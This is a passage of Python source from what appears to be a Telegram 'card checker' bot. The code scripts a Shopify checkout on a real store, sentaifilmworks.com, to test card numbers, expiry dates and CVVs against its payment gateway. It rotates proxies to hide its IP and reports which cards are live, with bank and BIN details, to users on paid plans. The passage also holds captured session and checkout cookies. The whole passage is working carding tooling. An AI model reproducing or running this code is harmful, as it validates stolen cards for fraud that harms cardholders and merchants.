_y=6b2a62a7-2a3c-4f26-a434-43f2064585d4; _s=39403cf8-0c71-4a2a-87cc-66dc65e37886; _shopify_y=6b2a62a7-2a3c-4f26-a434-43f2064585d4; _shopify_s=39403cf8-0c71-4a2a-87cc-66dc65e37886; _orig_referrer=; _landing_page=%2F; _shopify_sa_p=; _gid=GA1.2.1269029484.1694798871; _fbp=fb.1.1694798871956.652376748; swym-session-id="bxvkg8b8ekq7sf44tfuz29p4zdlos9vzes3n9sybp6byh3t9cw0ntnuqeoul6g97"; swym-pid="vgEWKY6lc8AP8dLF/WSgnUij9XJVYAqEWg5FF7oFL+E="; shopify_pay_redirect=pending; swym-o_s=true; swym-swymRegid="D341ZuBnmYQeMvYMgDXwdSyasz0uW4YR3vpxB9S5gwfwffW-XlnMikI5uzBaEtiddAITZiFODlZ62wxaTwt1VKiPpjQItqeXNn_-VfmzGqdlsTfzBLIVBDBaOEZGD3Yid662QHhHctxZkOYGZBqvkSL137IVV9Shkya-69HU6bQ"; swym-email=null; locale_bar_accepted=1; cart=291fab6f3d29d698eadb70df77456147; cart_sig=5a2ecd4d9f3e95d5eace7a1a04b7c86e; swym-cu_ct=undefined; swym-instrumentMap={}; keep_alive=b7dcf4a2-21c4-4f88-bdf0-732f84dc5755; cart_ts=1694799490; _cmp_a=%7B%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22merchant_geo%22%3A%22USUSTX%22%2C%22sale_of_data_region%22%3Afalse%7D; _secure_session_id=b328fcdff73704878d0f108fdeb5ba9e; checkout_session_token__co__893cf9e5350548edd25a1f7d465517ad=%7B%22token%22%3A%22bnZyU2xpcnlIVW4ybVpxemhwNVVJL3NKTVgxWTZNMTdacUZac3crVCtsOFNGcEJBbmhpdFN4VTUzRmJOTUxESWlwcEFOeVU0M2xRV1ROdnRjdlFxNWpNdEx2SFllZmx1Zzh5MXZhYWJ2Yk40ZENXRUdKMTNhRUpiTm1pczEwNGhyRHpaZXpGdUdkNmpBZWdCTHhuaDhJYnRMY3dHUXpBeHAvNmRPSGMzNjB4ZWJPTDVyaXFIS1hQZmZmNzlxVjF2dEIxVUN5OVdnN01Dd0tTUmpYYjZoajM3QVlHMjlPaldLemxhRURxTU1JZWhqNnYwRENRMVdVTWtpU3RBSXB4ZzlSZlMxblU9LS1DM3Zhc0ttbFY0eXJTT0xTLS0vVEt4K080dURWWUNZZ1pxRXl5eG93PT0%22%2C%22locale%22%3A%22en-US%22%7D; checkout_session_lookup=%7B%22version%22%3A1%2C%22keys%22%3A%5B%7B%22source_id%22%3A%22893cf9e5350548edd25a1f7d465517ad%22%2C%22checkout_session_identifier%22%3A%22893cf9e5350548edd25a1f7d465517ad%22%2C%22source_type_abbrev%22%3A%22co%22%2C%22updated_at%22%3A%222023-09-15T17%3A38%3A11.891Z%22%7D%5D%7D; cart_ver=gcp-us-central1%3A3; _checkout_queue_token=Ah36iuE4_MhtVEQDN5xqqzaff9wpcfwlHpgzkke4xRgJNIQqESjPGd45rGNhgbyAMK0IePkBwdRoxlmiMVby6LaH5xNs_9XabVGiClbfA0y1kB7EDr0VLIhGqjacUTqG9sgz_eAx5A2YwNViGWPAlS33Rm9THv4EeEiopzJEqzr9K-ERLsIT8_TwHQ%3D%3D; _checkout_queue_checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0T1ROalpqbGxOVE0xTURVME9HVmtaREkxWVRGbU4yUTBOalUxTVRkaFpBWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0xNVQxODo0MTo0OC45NDhaIiwicHVyIjoiY29va2llLl9jaGVja291dF9xdWV1ZV9jaGVja291dF90b2tlbiJ9fQ%3D%3D--2eed75bb968a010da3b371652f458e5d74ce3120; _shopify_sa_t=2023-09-15T17%3A41%3A51.440Z; _ga_JRR54MDV7Z=GS1.1.1694798870.1.1.1694799711.58.0.0; _ga_Z8HLNN1LY0=GS1.1.1694798871.1.1.1694799712.0.0.0; _ga=GA1.2.997971424.1694798871; _gat_UA-47434300-1=1; unique_interaction_id=93a9a90b-5c3b-461e-0fbc-912fb728c04b',
    'origin': 'https://www.sentaifilmworks.com',
    'referer': 'https://www.sentaifilmworks.com/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
}

    data_3 = f'_method=patch&authenticity_token={token_3}&previous_step=payment_method&step=&s={idpwnw}&checkout%5Bpayment_gateway%5D=55816326&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=&checkout%5Btotal_price%5D=2748&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=863&checkout%5Bclient_details%5D%5Bbrowser_height%5D=759&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240'


    req9 = session.post(url=url,headers=headers_4,data=data_3)

    time.sleep(5)

    req10 = session.get(url=str(url) + '?from_processing_page=1&validate=true')

    texto_4 = req10.text
    status_ = await response_sh(req9)
    response = find_between(texto_4,'<div class="notice__content"><p class="notice__text">','</p></div></div>')
    archivo = "/storage/emulated/0/Pixel_Chk/proxys.txt"
    ip = ocultar_ip(archivo)
    proxys = await verificar_proxies(archivo)
    
    await contra.edit_text(f"""<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Status: <code>{status_}</code></b> 
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Reponse: <code>{response}</code>
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Gateways: <code> Braintree </code>

⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Proxy: <code>{ip} {proxys}</code>
⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>""", disable_web_page_preview=True)